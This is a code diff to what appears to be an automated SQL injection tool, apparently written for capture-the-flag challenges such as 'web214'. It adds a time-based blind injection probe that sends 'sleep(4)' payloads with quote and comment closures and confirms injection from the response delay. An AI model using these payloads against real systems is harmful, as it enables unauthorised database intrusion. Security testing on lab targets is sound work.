@@ -85,6 +85,9 @@ class Detector:
                 uni = self._probe_union_first()
                 if uni is not None:
                     return uni
+                tj = self._probe_time_first()
+                if tj is not None:
+                    return tj
                 self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异，union 无回显）")
                 return None
         inj.form = self.form
@@ -136,6 +139,43 @@ class Detector:
                     inj.comment = "#"
                 self.form = form
                 return
+
+    def _probe_time_first(self) -> Optional[InjectionPoint]:
+        """时间盲注兜底（web214 类：无回显、无布尔差异，仅延时两态）。"""
+        import time as _t
+        base = self.s.spec.base_value or "1"
+        t0 = _t.perf_counter()
+        self._send(base)
+        if _t.perf_counter() - t0 > 2.5:
+            return None                     # 基线已慢，无延时差异可言
+        probes = [
+            ("", f"{base} or sleep(4)#"),
+            ("'", f"{base}'or sleep(4)#"),
+            ("", f"{base} xor sleep(4)#"),
+            ("'", f"{base}'xor sleep(4)#"),
+            ("", f"{base} and sleep(4)#"),
+            ("'", f"{base}'and sleep(4)#"),
+        ]
+        for closure, payload in probes:
+            if self.s.stopped:
+                return None
+            t0 = _t.perf_counter()
+            r = self._send(payload)
+            dt = _t.perf_counter() - t0
+            if r.status_code < 0 or dt < 3.5:
+                continue
+            inj = InjectionPoint(param=self.s.spec.param, base_value=base,
+                                 numeric=(closure == ""), closure=closure)
+            inj.comment = "#"
+            inj.form = "classic"
+            self.form = "classic"
+            self.log("INFO", f"时间盲注兜底命中（闭合 {closure!r}）：延时 {dt:.1f}s")
+            self.s.record_step(
+                "确认注入点（时间盲注）", payload,
+                f"无回显/布尔差异，{closure or '数字型'} + sleep 延时 "
+                f"{dt:.1f}s 确认注入")
+            return inj
+        return None
 
     # ------------------------------------------------------------------ closure
     def _probe_union_first(self) -> Optional[InjectionPoint]:
